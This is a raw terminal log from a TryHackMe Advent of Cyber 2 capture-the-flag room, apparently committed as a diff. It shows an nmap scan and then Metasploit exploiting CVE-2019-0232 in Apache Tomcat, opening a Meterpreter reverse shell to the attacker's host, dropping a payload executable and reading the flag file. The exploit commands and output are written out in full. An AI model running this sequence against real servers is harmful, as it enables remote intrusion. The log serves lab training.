@@ -1,0 +1,153 @@
+
+┌──(kali㉿kali)-[~/GitHub/TryHackMe/AdventOfCyber2]            
+└─$ sudo nmap -sV 10.10.6.35                                   
+[sudo] password for kali:                                      
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-26 08:11 EDT                                                               
+Nmap scan report for 10.10.6.35                                
+Host is up (0.11s latency).                                    
+Not shown: 996 filtered ports                                  
+PORT     STATE SERVICE       VERSION                           
+3389/tcp open  ms-wbt-server Microsoft Terminal Services       
+5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                          
+8009/tcp open  ajp13         Apache Jserv (Protocol v1.3)      
+8080/tcp open  http          Apache Tomcat 9.0.17              
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows       
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                
+Nmap done: 1 IP address (1 host up) scanned in 26.43 seconds   
+
+┌──(kali㉿kali)-[~/GitHub/TryHackMe/AdventOfCyber2]            
+└─$ sudo msfdb init && msfconsole                              
+[+] Starting database                                          
+[+] Creating database user 'msf'                               
+[+] Creating databases 'msf'                                   
+┏━(Message from Kali developers)                               
+┃                                                              
+┃ We have kept /usr/bin/python pointing to Python 2 for backwards                                                             
+┃ compatibility. Learn how to change this and avoid this message:                                                             
+┃ ⇒ https://www.kali.org/docs/general-use/python3-transition/  
+┃                                                              
+┗━(Run: “touch ~/.hushlogin” to hide this message)             
+[+] Creating databases 'msf_test'                              
+┏━(Message from Kali developers)                               
+┃                                                              
+┃ We have kept /usr/bin/python pointing to Python 2 for backwards                                                             
+┃ compatibility. Learn how to change this and avoid this message:                                                             
+┃ ⇒ https://www.kali.org/docs/general-use/python3-transition/  
+┃                                                              
+┗━(Run: “touch ~/.hushlogin” to hide this message)             
+[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'                                         
+[+] Creating initial database schema                           
+                                                               
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                 
+%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                 
+%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                 
+%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%                                                 
+%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                 
+%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                 
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                 
+%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                 
+%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%                                                 
+%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%                                                 
+%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%                                                 
+%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%                                                 
+%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %                                                 
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%                                                 
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%                                                 
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                 
+
+
+       =[ metasploit v6.0.48-dev                          ]    
++ -- --=[ 2139 exploits - 1139 auxiliary - 365 post       ]    
++ -- --=[ 592 payloads - 45 encoders - 10 nops            ]    
++ -- --=[ 8 evasion                                       ]    
+
+Metasploit tip: Use help <command> to learn more               
+about any command                                              
+
+msf6 > options                                                 
+
+Global Options:                                                
+===============                                                
+
+   Option             Current Setting      Description         
+   ------             ---------------      -----------         
+   ConsoleLogging     false                Log all console input and output                                                   
+   LogLevel           0                    Verbosity of logs (default 0, max 3)                                               
+   MeterpreterPrompt  meterpreter  The meterpreter prompt string                                                              
+   MinimumRank        0                    The minimum rank of exploits that will run without explicit confirmation           
+   Prompt             msf6                 The prompt string   
+   PromptChar         >                    The prompt character                                                               
+   PromptTimeFormat   %Y-%m-%d %H:%M:%S    Format for timestamp escapes in prompts                                            
+   SessionLogging     false                Log all input and output for sessions                                              
+   TimestampOutput    false                Prefix all console output with a timestamp                                         
+
+msf6 > set RHOSTS 10.10.6.35                                   
+RHOSTS => 10.10.6.35                                           
+msf6 > set LHOSTS 10.6.85.73                                   
+LHOSTS => 10.6.85.73                                           
+msf6 > search 2019-0232                                        
+
+Matching Modules                                               
+================                                               
+
+   #  Name                                         Disclosure Date  Rank       Check  Description                             
+   -  ----                                         ---------------  ----       -----  -----------                             
+   0  exploit/windows/http/tomcat_cgi_cmdlineargs  2019-04-10       excellent  Yes    Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability                                                                                                          
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/tomcat_cgi_cmdlineargs         
+
+msf6 > use 0                                                   
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp                                                      
+msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) > set targeturi /cgi-bin/elfwhacker.bat                                     
+targeturi => /cgi-bin/elfwhacker.bat                           
+msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) > run        
+
+[*] Started reverse TCP handler on 10.6.85.73:4444             
+[*] Executing automatic check (disable AutoCheck to override)  
+[+] The target is vulnerable.                                  
+[*] Command Stager progress -   6.95% done (6999/100668 bytes) 
+[*] Command Stager progress -  13.91% done (13998/100668 bytes)
+[*] Command Stager progress -  20.86% done (20997/100668 bytes)
+[*] Command Stager progress -  27.81% done (27996/100668 bytes)
+[*] Command Stager progress -  34.76% done (34995/100668 bytes)
+[*] Command Stager progress -  41.72% done (41994/100668 bytes)
+[*] Command Stager progress -  48.67% done (48993/100668 bytes)
+[*] Command Stager progress -  55.62% done (55992/100668 bytes)
+[*] Command Stager progress -  62.57% done (62991/100668 bytes)
+[*] Command Stager progress -  69.53% done (69990/100668 bytes)
+[*] Command Stager progress -  76.48% done (76989/100668 bytes)
+[*] Command Stager progress -  83.43% done (83988/100668 bytes)
+[*] Command Stager progress -  90.38% done (90987/100668 bytes)
+[*] Command Stager progress -  97.34% done (97986/100668 bytes)
+[*] Command Stager progress - 100.02% done (100692/100668 bytes)                                                              
+[*] Sending stage (175174 bytes) to 10.10.6.35                 
+[!] Make sure to manually cleanup the exe generated by the exploit                                                            
+[*] Meterpreter session 1 opened (10.6.85.73:4444 -> 10.10.6.35:50020) at 2021-06-26 08:34:14 -0400                           
+
+meterpreter > shell                                            
+Process 2380 created.                                          
+Channel 1 created.                                             
+Microsoft Windows [Version 10.0.17763.1637]                    
+(c) 2018 Microsoft Corporation. All rights reserved.           
+
+C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi-bin>dir                                       
+dir                                                            
+ Volume in drive C has no label.                               
+ Volume Serial Number is 4277-4242                             
+
+ Directory of C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi-bin                             
+
+26/06/2021  17:34    <DIR>          .                          
+26/06/2021  17:34    <DIR>          ..                         
+19/11/2020  22:39               825 elfwhacker.bat             
+19/11/2020  23:06                27 flag1.txt                  
+26/06/2021  17:34            73,802 lIHEN.exe                  
+               3 File(s)         74,654 bytes                  
+               2 Dir(s)   7,445,561,344 bytes free             
+
+C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi-bin>type flag1.txt                            
+type flag1.txt                                                 
+thm{whacking_all_the_elves}                                    
+C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi-bin>                                          
